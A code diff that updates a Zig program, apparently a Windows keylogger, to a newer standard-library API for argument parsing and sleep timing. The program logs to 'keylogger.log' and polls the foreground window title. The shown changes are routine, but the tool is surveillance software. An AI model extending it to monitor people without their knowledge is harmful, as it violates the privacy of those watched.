@@ -1,6 +1,7 @@
 const VERSION = "2.2.0-dev.1";
 const std = @import("std");
 const Clock = std.Io.Clock;
+const Duration = std.Io.Duration;
 const File = std.Io.File;
 const Writer = std.Io.Writer;
 const Allocator = std.mem.Allocator;
@@ -32,7 +33,8 @@ pub fn main(init: std.process.Init) !void {
     var stdout_writer = File.stdout().writer(io, stdout_buffer);
     const stdout = &stdout_writer.interface;
 
-    var args_iter = minimal.args.iterate();
+    //var args_iter = minimal.args.iterate();
+    var args_iter = try minimal.args.iterateAllocator(allocator);
     defer args_iter.deinit();
     _ = args_iter.next();
 
@@ -41,7 +43,7 @@ pub fn main(init: std.process.Init) !void {
 
     var arg_verbose: u8 = 0;
     var arg_use_date = false;
-    var arg_sleep: usize = 0;
+    var arg_sleep: i64 = 10;
     while (args_iter.next()) |arg| {
         if (eql(u8, arg, "-h") or eql(u8, arg, "--help")) {
             try printHeader(stdout);
@@ -60,7 +62,7 @@ pub fn main(init: std.process.Init) !void {
             arg_use_date = true;
         } else if (eql(u8, arg, "-s") or eql(u8, arg, "--sleep")) {
             if (args_iter.next()) |next_arg| {
-                arg_sleep = try parseInt(usize, next_arg, 10);
+                arg_sleep = try parseInt(i64, next_arg, 10);
             }
         }
     }
@@ -79,10 +81,9 @@ pub fn main(init: std.process.Init) !void {
             try arg_output_path.appendSlice(allocator, "keylogger.log");
         }
     }
-    if (arg_sleep <= 3) {
+    if (arg_sleep < 10) {
         arg_sleep = 10;
     }
-    arg_sleep *= std.time.ns_per_ms;
 
     const file_exists = fileExists(allocator, arg_output_path.items);
 
@@ -122,7 +123,10 @@ pub fn main(init: std.process.Init) !void {
 
     var prev_type: PrevType = .init;
     while (true) {
-        io.sleep(arg_sleep);
+        const d: Duration = .fromMilliseconds(arg_sleep);
+        const c: Clock = .real;
+        try io.sleep(d, c);
+        //try io.sleep(.fromMilliseconds(arg_sleep), .real);
 
         const hwnd: cWindows.HWND = cWindows.GetForegroundWindow();
         const ctitle_len = cWindows.GetWindowTextA(hwnd, ctitle_b.ptr, title_len_i);
